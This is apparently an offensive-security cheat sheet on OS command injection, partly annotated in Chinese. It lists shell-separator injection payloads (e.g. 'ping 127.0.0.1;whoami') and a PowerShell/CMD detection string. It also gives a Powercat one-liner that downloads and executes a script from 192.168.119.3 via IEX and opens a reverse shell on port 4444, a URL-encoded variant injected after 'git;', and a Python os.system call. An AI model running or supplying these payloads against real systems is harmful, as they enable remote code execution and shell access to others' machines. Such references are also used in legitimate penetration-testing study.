### OS Command Injection
###### Common ways
```
;：执行完前面的语句再执行后面的。例如： ping 127.0.0.1;whoami。
|：显示后面语句的执行结果。例如： ping 127.0.0.1|whoami。
||：或，如果前面命令成功执行，那么命令结束执行；当前面的语句执行出错时，执行后面的语句。例如： ping 127.0.0.1||whoami。
&：如果前面的语句为假则直接执行后面的语句，前面的语句可真可假 。例如： ping 127.0.0.1&whoami。
&&：如果前面的语句为假则直接出错，也不执行后面的，前面的语句只能为真。例如： ping 127.0.0.1&&whoami。
```
###### Powershell Or CMD
```
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
urlencode((dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell)
```
###### Powercat
>Powercat is a PowerShell implementation of Netcat included in Kali
```
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell
urlencode(git;IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell)
```
### Python3
```
__import__('os').system('cmd')
```
